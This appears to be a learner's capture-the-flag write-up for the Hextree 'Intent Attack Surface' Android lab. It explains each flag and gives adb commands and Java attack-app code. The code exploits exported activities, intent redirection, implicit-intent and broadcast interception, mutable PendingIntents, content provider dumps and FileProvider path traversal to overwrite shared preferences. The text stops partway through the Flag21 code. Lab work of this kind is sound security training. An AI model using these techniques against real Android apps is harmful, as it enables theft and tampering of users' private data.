### Flag1
command to start activity
adb shell am start -n io.hex.tree.attacksurface/.activities.Flag1Activity
HXT\{basic-exported-activity-1bh7sd\}
### Flag2
command to start an specific activity with an action
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
HXT\{intent-actions-activity-dsj198w\}
![](./images/Intent-Attack-Surface-img-0.png)
### Flag3
command to start an specific activity with an action to load an url which is specified in the code
adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d "[https://app.hextree.io/map/android](https://app.hextree.io/map/android)"
HXT\{intent-uri-data-sda982bs\}
![](./images/Intent-Attack-Surface-img-1.png)

### Flag4
The `enum State` defines five possible "modes" the Activity can be in. To get the flag, you must move through them in this exact order:
1. **INIT** (Start)
2. **PREPARE**
3. **BUILD**
4. **GET_FLAG** (The Win Condition)
5. **REVERT** (A fallback state)
![](./images/Intent-Attack-Surface-img-2.png)
The `stateMachine()` method is the brain of this Activity. It looks at two things every time it runs:
- **What state are we in right now?** (Stored in `SolvedPreferences` which is a type of shared preferences)
- **What "Action" did you just send?** (Passed via an `Intent`)
If you send the right **Action** for your current **State**, you move to the next level:
- **If State = INIT:** You must send an Intent with the action `"PREPARE_ACTION"`.
- **If State = PREPARE:** You must send an Intent with the action `"BUILD_ACTION"`.
- **If State = BUILD:** You must send an Intent with the action `"GET_FLAG_ACTION"`.
- **If State = GET_FLAG:** The code runs `success(this)` and gives you the flag!
so its like opening an activity one after another so the commands are
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity

### Flag 5
- **Start ****`Flag5Activity`**: You launch the main **Intent** to open the screen.
- **Provide ****`intent2`**: Inside that main Intent, you must include a nested Intent (`intent2`) that contains the number **42**.
- **Include ****`nextIntent`**: Inside `intent2`, you must nest a third Intent (`nextIntent`).
- **Set the Trigger**: Inside `nextIntent`, you must set the "reason" to **"back"**.
- **The Result**: The Activity unpacks this entire chain and runs the `success()` function.
So the code should be in reverse way to launch the success() in newIntent 
```java
Intent nextIntent = new Intent();
nextIntent.putExtra("reason", "back");
Intent intent2 = new Intent();
intent2.putExtra("return", 42);
intent2.putExtra("nextIntent", nextIntent);
Intent exploitIntent = new Intent();
exploitIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
exploitIntent.putExtra("android.intent.extra.INTENT", intent2);
startActivity(exploitIntent);
```

### Flag7
In order to acquire this flag we need to know about what is onNewIntent because sucess method is inside `onNewIntent(Intent intent)` and not inside `onCreate` method
What is onNewIntent and why its used instead of onCreate?
onNewIntent is a method which consists of singleTop mode which prevents from the ui to load multiple times for a single intent which costs low ram , it uses previous ui of that activity instead if creating a new one like onCreate 
SingleTop is a mode which reuses the ui of previous activity
what happens if everyone uses onNewIntent instead of onCreate?
when user click back button we would close the whole app instead of closing that single screen
![](./images/Intent-Attack-Surface-img-3.png)
![](./images/Intent-Attack-Surface-img-4.png)

and the code specifies us to we have to first intent should have action `OPEN` and our second intent should have flag `FLAG_ACTIVITY_SINGLE_TOP` beacuse its in onNewIntent and action `REOPEN`  so i wrote the code in this way
we are sending the intent to io hex tree from this code
```java
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity"));
        intent.setAction("OPEN");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        intent.setAction("REOPEN");
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);
        finish();
```

### Flag 6
Flag 6 is is not exported so other apps cant interact with it but we can interact with it using flag5 since its sending an intent to flag6
this challenge is related to flag5 activity where the if and else where the else sends the activity to flag activity 6 which we can confirm by this code below
![](./images/Intent-Attack-Surface-img-5.png)
the below code first starts flag5 activity which we previously discussed about the nested intent and finally the incoming intent of flag6 activity should have the flag  `FLAG_GRANT_READ_URI_PERMISSION` and the value of this flag is 1
![](./images/Intent-Attack-Surface-img-6.png)
The above code snipper indicates the flag6 activity and its performing a boolean and operation with the flag we sent
```java
        Intent flag6Intent = new Intent();
        flag6Intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
        flag6Intent.putExtra("reason", "next");
        flag6Intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Intent flag5 = new Intent();
        flag5.putExtra("return", 42);           
        flag5.putExtra("nextIntent", flag6Intent);
        Intent launch = new Intent();
        launch.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        launch.putExtra("android.intent.extra.INTENT", flag5);
        startActivity(launch);
        finish();
```
In this way we can start an activity which is set exported activity is false if one activity is the reason to star another activity through intents

### Flag8
![](./images/Intent-Attack-Surface-img-7.png)
- In this activity we need to call the activity using `startActivityForResult()` from our attack app 
- Also, it checks the name of the class from which the intent is sent because the above snapshot of code uses getClassName(), and it should contain "Hextree" so our activity name should be Flag9Hextree or anyother class name that contains Hextree
- getCallingActivity() is used when a intent is launched with expecting result back and wants to know which activity launched the intent ( where we used` startActivityForResult()` in our attack app)
Hence the code is used to attack the app is
```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity"));
        startActivityForResult(intent, 42);
    }
}
```
Basic info of the above solution
1. **`setComponent`** to address the Hextree app.
2. **`startActivityForResult`** to send the request along with the component name(class name)
3. **`getCallingActivity`** to check your "ID." and gets the request
4.  **`setResult`** to pack the flag.
5. **`onActivityResult`** to catch and show the flag back again to the creator of startActivityForResult

### Flag9
![](./images/Intent-Attack-Surface-img-8.png)
This is activity is almost same as previous activity but here the code is expecting a result and we use startActivityForResult and the target app sends us result again after meeting the conditions and send us using setresult(), so in our attack app we use onActivityResult to catch that result   
```java
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);

        Intent i = new Intent();
        i.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
        startActivityForResult(i, 42);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        String flag = data.getStringExtra("flag");
        Toast.makeText(this, flag, Toast.LENGTH_SHORT).show();
        finish();
    }
```

### Flag10
in the jadx code they mentioned about intent.addflag(8) which helps in debugging letting us see exactly why an Intent might be failing to reach your app.
![](./images/Intent-Attack-Surface-img-9.png)
The vulnerablity:
It sends an **Implicit Intent**. It doesn't specify which app should receive it; it just tells Android: *anyone who can handle *`io.hextree.attacksurface.ATTACK_ME` can have this *flag*
![](./images/Intent-Attack-Surface-img-10.png)
So we make an attack code such that we can handle the implicit intent by adding it in AndroidManifest.xml 
We set exported to true so that the hextree app can open our attack app make contact with us 
```xml
<activity
            android:name=".flag10"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
```
And the activity that handles the flag receiving and prints it in log message since we have specified the implicit intent handler and the class we just use getIntent() to get the flag
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        String flag = intent.getStringExtra("flag");
        Log.d("Flag10"+ flag);
    }
```
### Flag 11
This challenge is almost similar to previous one but here we should pass some extra values to reach the success(this) method
![](./images/Intent-Attack-Surface-img-11.png)
Since the app code uses onActivityResult() we are sending the result using setResult() and then passing the extra values to reach the intent
```java
@Override
protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        intent.putExtra("token", 1094795585);
        setResult(42, intent);
    }
```
### Flag12
This challenge is almost similar to previous one but to launch activity we have send a Boolean expression which is labelled as true 
![](./images/Intent-Attack-Surface-img-12.png)
From analysing the code we can see that the app is sending a intent using startActivityForResult()
but there is no use in catching the activity because the success function is in onActivityResult so we have to to use setResult method to send the required intent
since the implicit intent lies in if condition first we have to send an intent to make the app start its calling sending implicit intent to allow apps other apps to control its action then we send the extra token
MainActivity
```java
@Override
public void onClick(View v) {
                Intent intent2 = new Intent();
                intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");
                intent2.putExtra("LOGIN", true);
                startActivity(intent2);
            }
```
Flag12Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        intent.putExtra("token", 1094795585);
        setResult(42, intent);
        }
```
### Flag22
![](./images/Intent-Attack-Surface-img-13.png)
In the above jadx code we can see that our target app is waiting for a intent which is labelled as PENDING so we create a pending intent to send to our target app from our attack app 
the method getParcelableExtra is like a hand that gets the activity 
- **Creation :** You use **`getActivity()`** to build the `PendingIntent`.
- **Transport:** You put that `PendingIntent` into a regular `Intent` using `putExtra("PENDING", pendingIntent)`.
- **Extraction :** App A uses **`getParcelableExtra("PENDING")`** to pull your "envelope" out of the delivery.
- **Execution :** App A calls `pendingIntent.send()`.
MainActivity
```java
@Override
            public void onClick(View v) {
                Intent targetIntent = new Intent(MainActivity.this, flag22.class);
                PendingIntent pendingIntent = PendingIntent.getActivity(MainActivity.this,42,targetIntent, PendingIntent.FLAG_UPDATE_CURRENT);

                Intent sendIntent = new Intent();
                sendIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity");
                sendIntent.putExtra("PENDING", pendingIntent);
                startActivity(sendIntent);
            }
```
We create a target intent which points back to flag22 activity in our app 
The basic pendingIntents have 4 arguments 
1.The creator of the pending intent
2.The request code or identifier
3.The intent
4.The flag
Create a pending intent saying the creator is the MainActivity set the request code as 42 and send the target Intent (since the target intent is pointing to flag22 activity we send the received intent to flag22)
Flag22Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String flag = getIntent().getStringExtra("flag");
        Log.d("Flag22","flag" + flag);
    }
```
### Flag23
![](./images/Intent-Attack-Surface-img-14.png)
JADX CODE
![](./images/Intent-Attack-Surface-img-15.png)

In the above ss we can see there is a value 33554432 which means it is a Mutable flag and since the app is using implicit intent we have change our android manifest and make our app receive that intent 
AndroidManifest.xml
```xml
<activity
            android:name=".flag23"
            android:exported="true" >
            <intent-filter>
                <action android:name="io.hextree.attacksurface.MUTATE_ME"/>
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
```

the Intent Surface Attack app is sending a pending intent which should be recieved by our app with a tag pending_intent, so we create a new intent called received intent to capture the pending intent
using getParcelableExtra() 
Since there a set action in intent  GIVE_FLAG we need to pass that through our code too
we got an empty intent which we can observe in the code since the intent is mutable we can add our own data to the pending intent
And we finally send the pending intent using penddingIntent.send()
Flag23Activity(Reciever)
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent receivedIntent = getIntent();
        PendingIntent pendingIntent = receivedIntent.getParcelableExtra("pending_intent");
        Intent newIntent = new Intent();
        newIntent.setAction("io.hextree.attacksurface.GIVE_FLAG");
        newIntent.putExtra("code", 42);

        try {
            pendingIntent.send(this, 0, newIntent);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }
```
### Flag13
A basic web uri structure looks like scheme://host:port/path?query#fragment
The .BROWSABLE category tells us this app can be opened from a web view the scheme hex and host can be either open or flag
![](./images/Intent-Attack-Surface-img-16.png)
and the jadx code tells us the scheme should be hex and the host can be either flag or open the query paramenter action should be equal to give-me so the url we can use are
an example url is already given by the challenge so we can just follow it
hex://flag?action=give-me ; hex://open?action=give-me
![](./images/Intent-Attack-Surface-img-17.png)
### Flag14
![](./images/Intent-Attack-Surface-img-18.png)
From the jadx code we can understand there are query parameters type, authtoken and authcallenge 
The method to call success we need to set type == admin, authtoken == the base64 strings(because it is what it is being compared) and if we observe closely while loading the webview of flag14 there is an uuid being generated (UUID is Universally Unique Identifier. It is a 128-bit number used to uniquely identify information in computer systems, designed to be globally unique) it is using the same uuid to the same uri which loads flag14 so the uri should be 
hex://token?authToken=598cc075e4379d027f61c02866917c6f1d992c67&type=admin&authChallenge=a2e25516-1502-47bd-8797-5996973fca5a
i used this in flag13 webview and got the flag
### Flag15
This challenge descriptions says that we have to use intent scheme the basic syntax of intent scheme is 
```sql
intent:
   HOST/URI-path // Optional host
   #Intent;
      package=\[string\];
      action=\[string\];
      category=\[string\];
      component=\[string\];
      scheme=\[string\];
   end;
```
In the jadx code we can see the different flags we need to set with uri in order to call the success
![](./images/Intent-Attack-Surface-img-19.png)
This says we need to add string as flag and boolean value to true to the uri
It is automatically set to false by default by setting it true we are saying that the extras exist and that is flag and we dont need to add the extra string because its not checking the string value so using tthe boolean value is enough for the challenge
![](./images/Intent-Attack-Surface-img-20.png)
The above picture indicates the different methods to include extras we can include with the uri
So the final uri will be intent:#Intent;package=io.hextree.attacksurface;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end;
### Flag30
![](./images/Intent-Attack-Surface-img-21.png)
The above image tells us the basic syntax of a content uri
![](./images/Intent-Attack-Surface-img-22.png)
The above images gives us the the authority we know the schema so the uri looks like
content://io.hextree.flag30/path
![](./images/Intent-Attack-Surface-img-23.png)
The above image gives us the path so the uri looks like
content://io.hextree.flag30/success and we set all other values to null so that we retrieve all the data from db without any filters
and from the dump uri the code is given by challenge creator itself to dump everything in db using cursor

null (1st) Projection "Which columns do I want?" (Null = Give me everything).
null (2nd) Selection "Which rows do I want?" (Filter/Where clause).
null (3rd) SelectionArgs The specific values for the filter above.
null (4th) SortOrder "How should the list be ordered?" (Alphabetical, Date, etc).
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag30/success"),
                null, null,
                null, null
        );
//dump uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```
cursor is a data base tool which let us navigate through out the data base movetofirst etc functions
contentResolver creates an entry point which helps us to get values needed from data base 
For example app A want to retrieve some data from app B so we use contentResolver without letting app A to search all our data base 
### Flag31
Learned that the content provider also has an option id so the the structure of content provider is
***`Structure of a Content URI:  content://authority/optionalPath/optionalID `***
![](./images/Intent-Attack-Surface-img-24.png)
Uri matcher is like hashmap but in hashmap we have to match every value since its a uri matcher which is developed by android studio we use it for example the below code is from official documentation
```sql
 private static final int PEOPLE = 1;
    private static final int PEOPLE_ID = 2;
    private static final int PEOPLE_PHONES = 3;
    private static final int PEOPLE_PHONES_ID = 4;
    private static final int PEOPLE_CONTACTMETHODS = 7;
    private static final int PEOPLE_CONTACTMETHODS_ID = 8;

    private static final int DELETED_PEOPLE = 20;

    private static final int PHONES = 9;
    private static final int PHONES_ID = 10;
    private static final int PHONES_FILTER = 14;

    private static final int CONTACTMETHODS = 18;
    private static final int CONTACTMETHODS_ID = 19;

    private static final int CALLS = 11;
    private static final int CALLS_ID = 12;
    private static final int CALLS_FILTER = 15;

    private static final UriMatcher sURIMatcher = new UriMatcher(UriMatcher.NO_MATCH);

    static
    {
        sURIMatcher.addURI("contacts", "people", PEOPLE);
        sURIMatcher.addURI("contacts", "people/#", PEOPLE_ID);
        sURIMatcher.addURI("contacts", "people/#/phones", PEOPLE_PHONES);
        sURIMatcher.addURI("contacts", "people/#/phones/#", PEOPLE_PHONES_ID);
        sURIMatcher.addURI("contacts", "people/#/contact_methods", PEOPLE_CONTACTMETHODS);
        sURIMatcher.addURI("contacts", "people/#/contact_methods/#", PEOPLE_CONTACTMETHODS_ID);
        sURIMatcher.addURI("contacts", "deleted_people", DELETED_PEOPLE);
        sURIMatcher.addURI("contacts", "phones", PHONES);
        sURIMatcher.addURI("contacts", "phones/filter/*", PHONES_FILTER);
        sURIMatcher.addURI("contacts", "phones/#", PHONES_ID);
        sURIMatcher.addURI("contacts", "contact_methods", CONTACTMETHODS);
        sURIMatcher.addURI("contacts", "contact_methods/#", CONTACTMETHODS_ID);
        sURIMatcher.addURI("call_log", "calls", CALLS);
        sURIMatcher.addURI("call_log", "calls/filter/*", CALLS_FILTER);
        sURIMatcher.addURI("call_log", "calls/#", CALLS_ID);
    }
```
we create an id for each path additionally in the same way we created an id for our path in our above code 
It returns 1 for path /flags and 2 for /flag/# where # acts as a placeholder for integers and \* is a place holder for a string of any length with valid characters 
![](./images/Intent-Attack-Surface-img-25.png)
the success method is in if block where id is 31 and imatch should be 2 which means the path should be /flag/31
hence the content uri will be content://io.hextree.flag31/flag/31 and the code that i wrote to solve the flag is 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag31/flag/31"),
                null, null,
                null, null
        );
//dump uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("flag", sb.toString());
            } while (cursor.moveToNext());
        }
    }
```
### Flag34
![](./images/Intent-Attack-Surface-img-26.png)
The above code is from flag34 activity by understanding the code we can say the code is waiting for an intent containg a string labelled as fliename and if the string is null it creates a file named secrets.txt it creates a new uri for this specific file using getfiledir() and sends it back using the method setresult() the addflag(3) represents its adding flags`FLAG_GRANT_READ_URI_PERMISSION FLAG_GRANT_WRITE_URI_PERMISSION` with the authority io.hextree.files which is present in the android manifest
![](./images/Intent-Attack-Surface-img-27.png)
so to call the function prepareflag which has the actual flag and send a string that contains thr path of flag34.txt along with the intent and it checks weather the file is present in the memory 
![](./images/Intent-Attack-Surface-img-28.png)
since the code is using getFilesDir() it checks for the path where the file is stored and then load them to check weather it exists or not 
since its using setresult it send the result we need to use onActivityResult() method to receive it in our attack code 
Since the app sends us a file instead of the text in that we have read that file the code for reading the file which is given in the video by the challenge creator and print in flags
```java
protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.putExtra("filename", "flags/flag34.txt");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
        startActivityForResult(intent, 42);
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 42 && data != null && data.getData() != null) {
            try (InputStream is = getContentResolver().openInputStream(data.getData());
                 BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {

                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("FLAG_EXTRACTOR", "Found Flag: " + line);
                }
            } catch (Exception e) {
                Log.e("FLAG_EXTRACTOR", "Error reading file", e);
            }
        }
    }
```
### Flag 35
This challenge introduces us to path traversal in app’s internal directory if we can get access to internal directory, we could make a potential exploit
The snapshot of code is from flag35 activity
![](./images/Intent-Attack-Surface-img-29.png)
This challenge is similar to previous challenge except a slight change in the directory where flag35.txt stored
This Flag uses a misconfigure path, which is root file path which essentially gives any file stored in the root storage
As we can see there is a flag35 provider class which uses the R.xml.rootpaths 
![](./images/Intent-Attack-Surface-img-30.png)
and in the xml file we can find the path where the files is being stored the below snapshot indicates the xml file of root access
![](./images/Intent-Attack-Surface-img-31.png)
the authority is still the same one 
![](./images/Intent-Attack-Surface-img-32.png)
the method getfiledir() by default goes into the app’s files not to the app’s root directory
Hence the attack code I made for this challenge is and the filegetdir() function loads correctly we are using . ./flag35.txt because the flag is in root directory so we move one step backward
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.putExtra("filename", ". ./flag35.txt");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 42 && data != null && data.getData() != null) {
            try {
                InputStream inputStream = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("FLAG_EXTRACTOR", "Found Flag: " + line);
                }
            } catch (Exception e) {
                Log.e("FLAG_EXTRACTOR", "Error reading file", e);}
        }
    }
```
### Flag36
This challenge is also similar to the previous flag35 since the challenge provider mentioned the flag36.txt should be accessed by abusing flag35 and overwrite flag36.xml
since flag35 is stored in root directory and it has flag(3) which is a permission to both reading and writing files we need to gain access to flag35 get access to write in a file and move to the shared preferences to access the file of flag36  
![](./images/Intent-Attack-Surface-img-33.png)
flag36 is a xml file which has a string and a Boolean value which is solved and false so we need to change that to true   so i used a string builder to read and store the text and i used a replace function to replace the flase into true and send the same file to flag36 activity so the challenge gets solved 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = new Intent();
        intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        startActivityForResult(intent, 42);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 42 && data != null && data.getData() != null) {
            try {
                StringBuilder sb = new StringBuilder();
                InputStream is = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line.replace("false", "true")).append("\n");
                }
                is.close();
                OutputStream os = getContentResolver().openOutputStream(data.getData());
                os.write(sb.toString().getBytes());
                os.close();
                Intent i = new Intent();
                i.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag36Activity");
                startActivity(i);

                Log.i("ATTACK", "Done");

            } catch (Exception e) {
                Log.e("ATTACK", "Error");
            }
        }
    }
```


### Flag16
what can be things that can be passed through broadcast?
You can pass **primitives (Strings, ints), Parcelable/Serializable objects, URIs, and PendingIntents** via Intent extras in a broadcast.
The tutorial tells us the Broadcast receivers are similar to intents so same attack methods and unlike intent will startactivity() we will use sendBroadcast()
If we observe the code from jadx
![](./images/Intent-Attack-Surface-img-34.png)
There is string flagsecret which is being compared to the intent we are going to send from our attack app with label flag so we can send the intent through broadcast by specifying the package and class
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
        intent.putExtra("flag","give-flag-16");
        sendBroadcast(intent);
    }
```

### Flag17
Broadcasts can be of 2 types of dynamic broadcast receiver and a static broadcast receiver which we can implement by declaring in android manifest  
The difference between both of them are dynamic receivers only work when the app is active but static registers work even when the app is closed and can receive broadcasts any time and system can start the app
Static registers increase the scope of vulnerabilities 
startActivityForResult() is similar to sendOrderedBroadcast() isOrderedBroadcast() method is similar to getCallingActivity() and onOrderedBroadcast() is similar to onactivityresult() and finally setresult() is similar to setResultData() or setResultsExtra()

| **Feature** | **Activity (startActivityForResult)** | **Ordered Broadcast (sendOrderedBroadcast)** |
| --- | --- | --- |
| **The Initial Call** | `startActivityForResult()` | `sendOrderedBroadcast()` |
| **Checking the Link** | `getCallingActivity()` (Checks who is waiting for the result) | `isOrderedBroadcast()` (Checks if the sender allows a return result) |
| **Receiving the Request** | `onCreate()` | **`onReceive()`** (Corrected from `onOrderedBroadcast`) |
| **Sending the Data Back** | `setResult()` | `setResultData()` or `setResultExtras()` |
| **Catching the Result** | `onActivityResult()` | `onReceive()` (for the final `resultReceiver` defined in the sender) |

![](./images/Intent-Attack-Surface-img-35.png)
If you observe closely the target app has an receiver so we just simply connect to the receiver
The above code snippet is form flag17 activity it is using onReceive function to check if there are any broadcasts are incoming if yes then it will check is this an onOrderedBroadcast using the method isOrderedBroadcast() if yes then it will check the intent coming through broadcast  
There is a flagsecret which is hardcoded and being compared to our intent
```java
Intent intent = new Intent();
intent.putExtra("flag","give-flag-17");
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
sendOrderedBroadcast(intent, null);
```
There are different parameters and values we can pass into the sendOrderBroadcast() method those are
```java
sendOrderedBroadcast(
    intent,           // The intent to broadcast
    null,             // Permission (null = anyone can receive)
    resultReceiver,   // A final BroadcastReceiver that ALWAYS runs at the end
    null,             // A Handler to run the resultReceiver
    Activity.RESULT_OK, // Initial result code
    null,             // Initial result data
    null              // Initial result extras
);
```
### Flag18
In this challenge the target app doesnt have a receiver, but its trying to send info through broadcast so this means we have to set a receiver and we use intent 
In android 8 or above we cant simply create a BroadcastReceiver since it consumes a lot of battery and ram to save so we have to dynamically register a receiver broadcast
![](./images/Intent-Attack-Surface-img-36.png)
The above jadx code of flag18 the target app is sending a broadcast and success method is called when resultcode which came with the broadcast through intent shouldn’t be 0
First tried to use a static receiver just by creating a receiver tag in the manifest with the action io.hextre.broadcast.FREE_FLAG and then sent the resultcode as 42 and then tried to run but the app is simply crashing, the static receiver is just for android 8 or lesser and the new version need to initiate as dynamic receiver and then send the broadcast through the dynamic receiver as shown below
By analysing the code we can see that the app is sending an sendOrderedBroadcast() we can set our required values for result code , request code, flags etc..
```java
BroadcastReceiver receiver = new BroadcastReceiver() {
@Override
public void onReceive(Context context, Intent intent) {
    setResultCode(42);
}
};
registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```
we use intent filter to say to which broadcast we are going to connect
### Flag19
The below picture represents the success Flag19 Activity 
![](./images/Intent-Attack-Surface-img-37.png)
The below ss represents the success function of Flag19widget
![](./images/Intent-Attack-Surface-img-38.png)

In the challenge the description in the video says that intent surface attack app has a widget showing the number flags solved so far and that can be also refreshed and update on click on the widget.

How the code works:
When we click on the widget of Intent surface attack app the widget sends a broadcast using an action APPWIDGET_UPDATE and while using AppWidgetManager we can get the size of the widget which is passed into updatewidget function which updates the data fetching in from Solved preferences which contains the data of solved flags and display them on the widget again. To call the success the code checks for the widgets max and min which we get from a bundle if it matches with the given value we will get the flag

What is a bundle?
A **Bundle** is Android’s specialized "data suitcase," a key-value map designed to transport information across the OS. While it acts like a simple container for primitives (ints, strings) and complex objects, its true power lies in its optimization for **Inter-Process Communication (IPC)**—allowing data to safely travel between different apps or between components within the same app (like Activities and Fragments). It is the backbone of the Android lifecycle, used to "handshake" with the system for widget updates, preserve UI state during screen rotations, and pass arguments to fragments. Just remember its golden rule: it’s meant for small, serialized "metadata," as exceeding its **1MB limit** will cause the system to drop the suitcase and crash your app.

There are 2 solutions for this case:
Case1: We can change the widget height using resize button and then click on the widget which call the success method
Case 2: As we previously discussed that the widget sends a broadcast our attacker app creates that broadcast send out bundle instances which contains the exact values the app is expecting for and calls the success activity here we are simply mimicking the widget and we send the intent which contains the bundle named appWidgetOptions and set the actions too 
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setAction("APPWIDGET_UPDATE");
        Bundle bundle = new Bundle();
        bundle.putInt("appWidgetMaxHeight", 1094795585);
        bundle.putInt("appWidgetMinHeight", 322376503);
        intent.putExtra("appWidgetOptions", bundle);
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
        sendBroadcast(intent);
    }
```

### Flag20
The below ss represents the Flag20Activity
![](./images/Intent-Attack-Surface-img-39.png)
There is an action that is need to be received 
The below ss represents the Flag20receiver which acts when the notification is clicked
![](./images/Intent-Attack-Surface-img-40.png)
Notifications also use broadcast pending intents in this case the code works in a way that when we click on the flag20 in intent surface attack app it sends a notification and dynamically registers a listener to listen to an action io.hextree.broadcast.GET_FLAG so we create our attack app which can communicate with that app using action saying that he can handle the case 
```java
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setAction("io.hextree.broadcast.GET_FLAG");
        intent.putExtra("give-flag", true);
        sendBroadcast(intent);
    }
```
Along with the intent to reach the success method we need to add few extras which is give-flag string and boolean value to true telling to give the flag 
In normal case when we click the notification flag20receiver receives it since it has the action io.hextree.broadcast.GET_FLAG and the give-flag is set to false so it wont return anything
### Flag21
![](./images/Intent-Attack-Surface-img-41.png)
In the above ss represents the code of the flag21 activity in this code it is waiting for a broadcast which contains few data and bundles but it isn't checking any of the data received so we don't need to send any extra data 
After launching this activity we get an notification with a button give flag 
Notifications are also handled by pending intents and broadcasts so when the notification is sent the broadcast triggers  
In the previous flag 20 we have a Flag20Receiver so we didn't need to listen to the broadcast just send the what the receiver needs but now in the case of flag 21 we need to listen to the broadcast because the broadcast contains the flag and we use intent filter saying that i want to listen to those kind of flags
The moment when the flag 21 is started it starts sending its broadcast and when we click on our attack app we receive it while its in mid air and prints it in our logs  and stores the flag in the variable flag
```java
@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
